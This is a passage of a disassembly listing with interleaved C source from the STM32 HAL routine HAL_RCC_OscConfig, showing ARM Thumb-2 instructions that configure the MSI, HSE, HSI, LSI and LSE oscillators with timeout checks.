 8003d0e:	f023 0301 	bic.w	r3, r3, #1
 8003d12:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003d14:	f7fd fb90 	bl	8001438 <HAL_GetTick>
 8003d18:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003d1a:	e008      	b.n	8003d2e <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003d1c:	f7fd fb8c 	bl	8001438 <HAL_GetTick>
 8003d20:	4602      	mov	r2, r0
 8003d22:	693b      	ldr	r3, [r7, #16]
 8003d24:	1ad3      	subs	r3, r2, r3
 8003d26:	2b02      	cmp	r3, #2
 8003d28:	d901      	bls.n	8003d2e <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003d2a:	2303      	movs	r3, #3
 8003d2c:	e314      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003d2e:	4b20      	ldr	r3, [pc, #128]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d30:	681b      	ldr	r3, [r3, #0]
 8003d32:	f003 0302 	and.w	r3, r3, #2
 8003d36:	2b00      	cmp	r3, #0
 8003d38:	d1f0      	bne.n	8003d1c <HAL_RCC_OscConfig+0x1dc>
 8003d3a:	e000      	b.n	8003d3e <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003d3c:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003d3e:	687b      	ldr	r3, [r7, #4]
 8003d40:	681b      	ldr	r3, [r3, #0]
 8003d42:	f003 0301 	and.w	r3, r3, #1
 8003d46:	2b00      	cmp	r3, #0
 8003d48:	d073      	beq.n	8003e32 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003d4a:	69bb      	ldr	r3, [r7, #24]
 8003d4c:	2b08      	cmp	r3, #8
 8003d4e:	d005      	beq.n	8003d5c <HAL_RCC_OscConfig+0x21c>
 8003d50:	69bb      	ldr	r3, [r7, #24]
 8003d52:	2b0c      	cmp	r3, #12
 8003d54:	d10e      	bne.n	8003d74 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003d56:	697b      	ldr	r3, [r7, #20]
 8003d58:	2b03      	cmp	r3, #3
 8003d5a:	d10b      	bne.n	8003d74 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003d5c:	4b14      	ldr	r3, [pc, #80]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d5e:	681b      	ldr	r3, [r3, #0]
 8003d60:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d64:	2b00      	cmp	r3, #0
 8003d66:	d063      	beq.n	8003e30 <HAL_RCC_OscConfig+0x2f0>
 8003d68:	687b      	ldr	r3, [r7, #4]
 8003d6a:	685b      	ldr	r3, [r3, #4]
 8003d6c:	2b00      	cmp	r3, #0
 8003d6e:	d15f      	bne.n	8003e30 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003d70:	2301      	movs	r3, #1
 8003d72:	e2f1      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003d74:	687b      	ldr	r3, [r7, #4]
 8003d76:	685b      	ldr	r3, [r3, #4]
 8003d78:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003d7c:	d106      	bne.n	8003d8c <HAL_RCC_OscConfig+0x24c>
 8003d7e:	4b0c      	ldr	r3, [pc, #48]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d80:	681b      	ldr	r3, [r3, #0]
 8003d82:	4a0b      	ldr	r2, [pc, #44]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d84:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003d88:	6013      	str	r3, [r2, #0]
 8003d8a:	e025      	b.n	8003dd8 <HAL_RCC_OscConfig+0x298>
 8003d8c:	687b      	ldr	r3, [r7, #4]
 8003d8e:	685b      	ldr	r3, [r3, #4]
 8003d90:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003d94:	d114      	bne.n	8003dc0 <HAL_RCC_OscConfig+0x280>
 8003d96:	4b06      	ldr	r3, [pc, #24]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d98:	681b      	ldr	r3, [r3, #0]
 8003d9a:	4a05      	ldr	r2, [pc, #20]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d9c:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003da0:	6013      	str	r3, [r2, #0]
 8003da2:	4b03      	ldr	r3, [pc, #12]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003da4:	681b      	ldr	r3, [r3, #0]
 8003da6:	4a02      	ldr	r2, [pc, #8]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003da8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003dac:	6013      	str	r3, [r2, #0]
 8003dae:	e013      	b.n	8003dd8 <HAL_RCC_OscConfig+0x298>
 8003db0:	40021000 	.word	0x40021000
 8003db4:	0800d4bc 	.word	0x0800d4bc
 8003db8:	20000000 	.word	0x20000000
 8003dbc:	20000004 	.word	0x20000004
 8003dc0:	4ba0      	ldr	r3, [pc, #640]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003dc2:	681b      	ldr	r3, [r3, #0]
 8003dc4:	4a9f      	ldr	r2, [pc, #636]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003dc6:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003dca:	6013      	str	r3, [r2, #0]
 8003dcc:	4b9d      	ldr	r3, [pc, #628]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003dce:	681b      	ldr	r3, [r3, #0]
 8003dd0:	4a9c      	ldr	r2, [pc, #624]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003dd2:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003dd6:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003dd8:	687b      	ldr	r3, [r7, #4]
 8003dda:	685b      	ldr	r3, [r3, #4]
 8003ddc:	2b00      	cmp	r3, #0
 8003dde:	d013      	beq.n	8003e08 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003de0:	f7fd fb2a 	bl	8001438 <HAL_GetTick>
 8003de4:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003de6:	e008      	b.n	8003dfa <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003de8:	f7fd fb26 	bl	8001438 <HAL_GetTick>
 8003dec:	4602      	mov	r2, r0
 8003dee:	693b      	ldr	r3, [r7, #16]
 8003df0:	1ad3      	subs	r3, r2, r3
 8003df2:	2b64      	cmp	r3, #100	; 0x64
 8003df4:	d901      	bls.n	8003dfa <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003df6:	2303      	movs	r3, #3
 8003df8:	e2ae      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003dfa:	4b92      	ldr	r3, [pc, #584]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003dfc:	681b      	ldr	r3, [r3, #0]
 8003dfe:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003e02:	2b00      	cmp	r3, #0
 8003e04:	d0f0      	beq.n	8003de8 <HAL_RCC_OscConfig+0x2a8>
 8003e06:	e014      	b.n	8003e32 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e08:	f7fd fb16 	bl	8001438 <HAL_GetTick>
 8003e0c:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003e0e:	e008      	b.n	8003e22 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003e10:	f7fd fb12 	bl	8001438 <HAL_GetTick>
 8003e14:	4602      	mov	r2, r0
 8003e16:	693b      	ldr	r3, [r7, #16]
 8003e18:	1ad3      	subs	r3, r2, r3
 8003e1a:	2b64      	cmp	r3, #100	; 0x64
 8003e1c:	d901      	bls.n	8003e22 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003e1e:	2303      	movs	r3, #3
 8003e20:	e29a      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003e22:	4b88      	ldr	r3, [pc, #544]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e24:	681b      	ldr	r3, [r3, #0]
 8003e26:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003e2a:	2b00      	cmp	r3, #0
 8003e2c:	d1f0      	bne.n	8003e10 <HAL_RCC_OscConfig+0x2d0>
 8003e2e:	e000      	b.n	8003e32 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003e30:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003e32:	687b      	ldr	r3, [r7, #4]
 8003e34:	681b      	ldr	r3, [r3, #0]
 8003e36:	f003 0302 	and.w	r3, r3, #2
 8003e3a:	2b00      	cmp	r3, #0
 8003e3c:	d060      	beq.n	8003f00 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003e3e:	69bb      	ldr	r3, [r7, #24]
 8003e40:	2b04      	cmp	r3, #4
 8003e42:	d005      	beq.n	8003e50 <HAL_RCC_OscConfig+0x310>
 8003e44:	69bb      	ldr	r3, [r7, #24]
 8003e46:	2b0c      	cmp	r3, #12
 8003e48:	d119      	bne.n	8003e7e <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003e4a:	697b      	ldr	r3, [r7, #20]
 8003e4c:	2b02      	cmp	r3, #2
 8003e4e:	d116      	bne.n	8003e7e <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003e50:	4b7c      	ldr	r3, [pc, #496]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e52:	681b      	ldr	r3, [r3, #0]
 8003e54:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003e58:	2b00      	cmp	r3, #0
 8003e5a:	d005      	beq.n	8003e68 <HAL_RCC_OscConfig+0x328>
 8003e5c:	687b      	ldr	r3, [r7, #4]
 8003e5e:	68db      	ldr	r3, [r3, #12]
 8003e60:	2b00      	cmp	r3, #0
 8003e62:	d101      	bne.n	8003e68 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003e64:	2301      	movs	r3, #1
 8003e66:	e277      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003e68:	4b76      	ldr	r3, [pc, #472]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e6a:	685b      	ldr	r3, [r3, #4]
 8003e6c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003e70:	687b      	ldr	r3, [r7, #4]
 8003e72:	691b      	ldr	r3, [r3, #16]
 8003e74:	061b      	lsls	r3, r3, #24
 8003e76:	4973      	ldr	r1, [pc, #460]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e78:	4313      	orrs	r3, r2
 8003e7a:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003e7c:	e040      	b.n	8003f00 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003e7e:	687b      	ldr	r3, [r7, #4]
 8003e80:	68db      	ldr	r3, [r3, #12]
 8003e82:	2b00      	cmp	r3, #0
 8003e84:	d023      	beq.n	8003ece <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003e86:	4b6f      	ldr	r3, [pc, #444]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e88:	681b      	ldr	r3, [r3, #0]
 8003e8a:	4a6e      	ldr	r2, [pc, #440]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003e8c:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003e90:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e92:	f7fd fad1 	bl	8001438 <HAL_GetTick>
 8003e96:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003e98:	e008      	b.n	8003eac <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003e9a:	f7fd facd 	bl	8001438 <HAL_GetTick>
 8003e9e:	4602      	mov	r2, r0
 8003ea0:	693b      	ldr	r3, [r7, #16]
 8003ea2:	1ad3      	subs	r3, r2, r3
 8003ea4:	2b02      	cmp	r3, #2
 8003ea6:	d901      	bls.n	8003eac <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003ea8:	2303      	movs	r3, #3
 8003eaa:	e255      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003eac:	4b65      	ldr	r3, [pc, #404]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003eae:	681b      	ldr	r3, [r3, #0]
 8003eb0:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003eb4:	2b00      	cmp	r3, #0
 8003eb6:	d0f0      	beq.n	8003e9a <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003eb8:	4b62      	ldr	r3, [pc, #392]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003eba:	685b      	ldr	r3, [r3, #4]
 8003ebc:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003ec0:	687b      	ldr	r3, [r7, #4]
 8003ec2:	691b      	ldr	r3, [r3, #16]
 8003ec4:	061b      	lsls	r3, r3, #24
 8003ec6:	495f      	ldr	r1, [pc, #380]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003ec8:	4313      	orrs	r3, r2
 8003eca:	604b      	str	r3, [r1, #4]
 8003ecc:	e018      	b.n	8003f00 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003ece:	4b5d      	ldr	r3, [pc, #372]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003ed0:	681b      	ldr	r3, [r3, #0]
 8003ed2:	4a5c      	ldr	r2, [pc, #368]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003ed4:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003ed8:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003eda:	f7fd faad 	bl	8001438 <HAL_GetTick>
 8003ede:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003ee0:	e008      	b.n	8003ef4 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003ee2:	f7fd faa9 	bl	8001438 <HAL_GetTick>
 8003ee6:	4602      	mov	r2, r0
 8003ee8:	693b      	ldr	r3, [r7, #16]
 8003eea:	1ad3      	subs	r3, r2, r3
 8003eec:	2b02      	cmp	r3, #2
 8003eee:	d901      	bls.n	8003ef4 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003ef0:	2303      	movs	r3, #3
 8003ef2:	e231      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003ef4:	4b53      	ldr	r3, [pc, #332]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003ef6:	681b      	ldr	r3, [r3, #0]
 8003ef8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003efc:	2b00      	cmp	r3, #0
 8003efe:	d1f0      	bne.n	8003ee2 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003f00:	687b      	ldr	r3, [r7, #4]
 8003f02:	681b      	ldr	r3, [r3, #0]
 8003f04:	f003 0308 	and.w	r3, r3, #8
 8003f08:	2b00      	cmp	r3, #0
 8003f0a:	d03c      	beq.n	8003f86 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003f0c:	687b      	ldr	r3, [r7, #4]
 8003f0e:	695b      	ldr	r3, [r3, #20]
 8003f10:	2b00      	cmp	r3, #0
 8003f12:	d01c      	beq.n	8003f4e <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003f14:	4b4b      	ldr	r3, [pc, #300]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f16:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f1a:	4a4a      	ldr	r2, [pc, #296]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f1c:	f043 0301 	orr.w	r3, r3, #1
 8003f20:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003f24:	f7fd fa88 	bl	8001438 <HAL_GetTick>
 8003f28:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003f2a:	e008      	b.n	8003f3e <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003f2c:	f7fd fa84 	bl	8001438 <HAL_GetTick>
 8003f30:	4602      	mov	r2, r0
 8003f32:	693b      	ldr	r3, [r7, #16]
 8003f34:	1ad3      	subs	r3, r2, r3
 8003f36:	2b02      	cmp	r3, #2
 8003f38:	d901      	bls.n	8003f3e <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003f3a:	2303      	movs	r3, #3
 8003f3c:	e20c      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003f3e:	4b41      	ldr	r3, [pc, #260]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f40:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f44:	f003 0302 	and.w	r3, r3, #2
 8003f48:	2b00      	cmp	r3, #0
 8003f4a:	d0ef      	beq.n	8003f2c <HAL_RCC_OscConfig+0x3ec>
 8003f4c:	e01b      	b.n	8003f86 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003f4e:	4b3d      	ldr	r3, [pc, #244]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f50:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f54:	4a3b      	ldr	r2, [pc, #236]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f56:	f023 0301 	bic.w	r3, r3, #1
 8003f5a:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003f5e:	f7fd fa6b 	bl	8001438 <HAL_GetTick>
 8003f62:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003f64:	e008      	b.n	8003f78 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003f66:	f7fd fa67 	bl	8001438 <HAL_GetTick>
 8003f6a:	4602      	mov	r2, r0
 8003f6c:	693b      	ldr	r3, [r7, #16]
 8003f6e:	1ad3      	subs	r3, r2, r3
 8003f70:	2b02      	cmp	r3, #2
 8003f72:	d901      	bls.n	8003f78 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003f74:	2303      	movs	r3, #3
 8003f76:	e1ef      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003f78:	4b32      	ldr	r3, [pc, #200]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f7a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f7e:	f003 0302 	and.w	r3, r3, #2
 8003f82:	2b00      	cmp	r3, #0
 8003f84:	d1ef      	bne.n	8003f66 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003f86:	687b      	ldr	r3, [r7, #4]
 8003f88:	681b      	ldr	r3, [r3, #0]
 8003f8a:	f003 0304 	and.w	r3, r3, #4
 8003f8e:	2b00      	cmp	r3, #0
 8003f90:	f000 80a6 	beq.w	80040e0 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003f94:	2300      	movs	r3, #0
 8003f96:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003f98:	4b2a      	ldr	r3, [pc, #168]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003f9a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003f9c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003fa0:	2b00      	cmp	r3, #0
 8003fa2:	d10d      	bne.n	8003fc0 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003fa4:	4b27      	ldr	r3, [pc, #156]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003fa6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003fa8:	4a26      	ldr	r2, [pc, #152]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003faa:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003fae:	6593      	str	r3, [r2, #88]	; 0x58
 8003fb0:	4b24      	ldr	r3, [pc, #144]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8003fb2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003fb4:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003fb8:	60bb      	str	r3, [r7, #8]
 8003fba:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003fbc:	2301      	movs	r3, #1
 8003fbe:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003fc0:	4b21      	ldr	r3, [pc, #132]	; (8004048 <HAL_RCC_OscConfig+0x508>)
 8003fc2:	681b      	ldr	r3, [r3, #0]
 8003fc4:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003fc8:	2b00      	cmp	r3, #0
 8003fca:	d118      	bne.n	8003ffe <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003fcc:	4b1e      	ldr	r3, [pc, #120]	; (8004048 <HAL_RCC_OscConfig+0x508>)
 8003fce:	681b      	ldr	r3, [r3, #0]
 8003fd0:	4a1d      	ldr	r2, [pc, #116]	; (8004048 <HAL_RCC_OscConfig+0x508>)
 8003fd2:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003fd6:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003fd8:	f7fd fa2e 	bl	8001438 <HAL_GetTick>
 8003fdc:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003fde:	e008      	b.n	8003ff2 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003fe0:	f7fd fa2a 	bl	8001438 <HAL_GetTick>
 8003fe4:	4602      	mov	r2, r0
 8003fe6:	693b      	ldr	r3, [r7, #16]
 8003fe8:	1ad3      	subs	r3, r2, r3
 8003fea:	2b02      	cmp	r3, #2
 8003fec:	d901      	bls.n	8003ff2 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003fee:	2303      	movs	r3, #3
 8003ff0:	e1b2      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003ff2:	4b15      	ldr	r3, [pc, #84]	; (8004048 <HAL_RCC_OscConfig+0x508>)
 8003ff4:	681b      	ldr	r3, [r3, #0]
 8003ff6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003ffa:	2b00      	cmp	r3, #0
 8003ffc:	d0f0      	beq.n	8003fe0 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003ffe:	687b      	ldr	r3, [r7, #4]
 8004000:	689b      	ldr	r3, [r3, #8]
 8004002:	2b01      	cmp	r3, #1
 8004004:	d108      	bne.n	8004018 <HAL_RCC_OscConfig+0x4d8>
 8004006:	4b0f      	ldr	r3, [pc, #60]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8004008:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800400c:	4a0d      	ldr	r2, [pc, #52]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 800400e:	f043 0301 	orr.w	r3, r3, #1
 8004012:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8004016:	e029      	b.n	800406c <HAL_RCC_OscConfig+0x52c>
 8004018:	687b      	ldr	r3, [r7, #4]
 800401a:	689b      	ldr	r3, [r3, #8]
 800401c:	2b05      	cmp	r3, #5
 800401e:	d115      	bne.n	800404c <HAL_RCC_OscConfig+0x50c>
 8004020:	4b08      	ldr	r3, [pc, #32]	; (8004044 <HAL_RCC_OscConfig+0x504>)
